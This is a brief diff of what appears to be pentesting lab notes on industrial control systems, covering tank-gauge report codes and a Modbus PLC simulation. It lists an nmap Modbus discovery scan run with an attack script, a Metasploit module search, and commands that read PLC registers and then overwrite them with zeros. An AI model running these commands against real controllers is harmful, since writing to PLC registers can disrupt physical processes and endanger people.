@@ -42,10 +42,10 @@ I20400 1 In-Tank Shift Inventory Report \
 I20500 1 In-Tank Status Report
 
 ## Modbus PLC Simulation
-sudo nmap -Pn 192.168.168.12 -p 502 --script ~/ICS_attack_scripts/Redpoint/modbus-discover.nse
-metasploit modules -> search modbus
+sudo nmap -Pn 192.168.168.12 -p 502 --script ~/ICS_attack_scripts/Redpoint/modbus-discover.nse \
+metasploit modules -> search modbus 
 
-modbus read 192.168.168.12 %MW0 10
+modbus read 192.168.168.12 %MW0 10 \
 modbus write 192.168.168.12 %MW0 0 0 0 0 0 0 0 0 0 
 
 ## Pentesting a ChronoGuard Infrastructure Substation
